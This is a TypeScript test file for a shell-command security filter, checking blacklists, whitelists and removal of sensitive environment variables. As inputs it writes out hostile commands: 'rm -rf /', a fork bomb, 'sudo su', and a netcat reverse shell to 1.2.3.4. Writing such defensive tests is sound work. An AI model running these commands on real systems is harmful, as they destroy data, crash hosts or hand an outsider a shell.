import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityFilter } from '../src/security/SecurityFilter.js';
import { checkBlocked, BlockedCategory, Severity } from '../src/security/CommandBlacklist.js';
import { isCommandAllowed, extractMainCommand } from '../src/security/CommandWhitelist.js';
import { isSensitiveEnvVar, filterSensitiveEnvVars } from '../src/security/SensitiveEnvVars.js';

describe('SecurityFilter', () => {
    let filter: SecurityFilter;

    beforeEach(() => {
        filter = new SecurityFilter(false, 8192);
    });

    describe('validate', () => {
        it('should allow safe commands', () => {
            const result = filter.validate('ls -la');
            expect(result.allowed).toBe(true);
        });

        it('should block empty commands', () => {
            const result = filter.validate('');
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('不能为空');
        });

        it('should block commands exceeding max length', () => {
            const longCommand = 'ls ' + 'a'.repeat(10000);
            const result = filter.validate(longCommand);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('超过限制');
        });

        it('should block rm -rf /', () => {
            const result = filter.validate('rm -rf /');
            expect(result.allowed).toBe(false);
            expect(result.severity).toBe(Severity.HIGH);
        });

        it('should block sudo commands', () => {
            const result = filter.validate('sudo apt update');
            expect(result.allowed).toBe(false);
            expect(result.severity).toBe(Severity.HIGH);
        });

        it('should block fork bomb', () => {
            const result = filter.validate(':(){ :|:& };:');
            expect(result.allowed).toBe(false);
        });
    });

    describe('validateEnvironment', () => {
        it('should filter sensitive environment variables', () => {
            const env = {
                PATH: '/usr/bin',
                PASSWORD: 'secret123',
                API_KEY: 'key123',
                NORMAL_VAR: 'value'
            };
            
            const filtered = filter.validateEnvironment(env);
            
            expect(filtered.PATH).toBe('/usr/bin');
            expect(filtered.NORMAL_VAR).toBe('value');
            expect(filtered.PASSWORD).toBeUndefined();
            expect(filtered.API_KEY).toBeUndefined();
        });
    });
});

describe('CommandBlacklist', () => {
    describe('checkBlocked', () => {
        it('should detect filesystem destruction patterns', () => {
            const result = checkBlocked('rm -rf /');
            expect(result).not.toBeNull();
            expect(result?.category).toBe(BlockedCategory.FILESYSTEM_DESTRUCTION);
        });

        it('should detect privilege escalation patterns', () => {
            const result = checkBlocked('sudo su');
            expect(result).not.toBeNull();
            expect(result?.category).toBe(BlockedCategory.PRIVILEGE_ESCALATION);
        });

        it('should detect network attack patterns', () => {
            const result = checkBlocked('nc -e /bin/bash 1.2.3.4 4444');
            expect(result).not.toBeNull();
            expect(result?.category).toBe(BlockedCategory.NETWORK_ATTACK);
        });

        it('should return null for safe commands', () => {
            const result = checkBlocked('ls -la /tmp');
            expect(result).toBeNull();
        });
    });
});

describe('CommandWhitelist', () => {
    describe('isCommandAllowed', () => {
        it('should allow whitelisted Linux commands', () => {
            expect(isCommandAllowed('/bin/ls', false)).toBe(true);
            expect(isCommandAllowed('/bin/cat', false)).toBe(true);
            expect(isCommandAllowed('/usr/bin/git', false)).toBe(true);
        });

        it('should allow whitelisted Windows commands', () => {
            expect(isCommandAllowed('dir', true)).toBe(true);
            expect(isCommandAllowed('git', true)).toBe(true);
        });

        it('should block non-whitelisted commands', () => {
            expect(isCommandAllowed('/usr/bin/somecmd', false)).toBe(false);
        });
    });

    describe('extractMainCommand', () => {
        it('should extract the main command from a simple command', () => {
            expect(extractMainCommand('ls -la')).toBe('ls');
        });

        it('should extract the main command from a piped command', () => {
            expect(extractMainCommand('cat file.txt | grep pattern')).toBe('cat');
        });

        it('should extract the main command from a chained command', () => {
            expect(extractMainCommand('cd /tmp && ls')).toBe('cd');
        });
    });
});

describe('SensitiveEnvVars', () => {
    describe('isSensitiveEnvVar', () => {
        it('should detect sensitive variable names', () => {
            expect(isSensitiveEnvVar('PASSWORD')).toBe(true);
            expect(isSensitiveEnvVar('API_KEY')).toBe(true);
            expect(isSensitiveEnvVar('AWS_SECRET_ACCESS_KEY')).toBe(true);
        });

        it('should not flag normal variable names', () => {
            expect(isSensitiveEnvVar('PATH')).toBe(false);
            expect(isSensitiveEnvVar('HOME')).toBe(false);
            expect(isSensitiveEnvVar('USER')).toBe(false);
        });
    });

    describe('filterSensitiveEnvVars', () => {
        it('should filter out sensitive variables', () => {
            const env = {
                PATH: '/usr/bin',
                SECRET_TOKEN: 'secret',
                NORMAL: 'value'
            };
            
            const filtered = filterSensitiveEnvVars(env);
            
            expect(filtered.PATH).toBe('/usr/bin');
            expect(filtered.NORMAL).toBe('value');
            expect(filtered.SECRET_TOKEN).toBeUndefined();
        });
    });
});
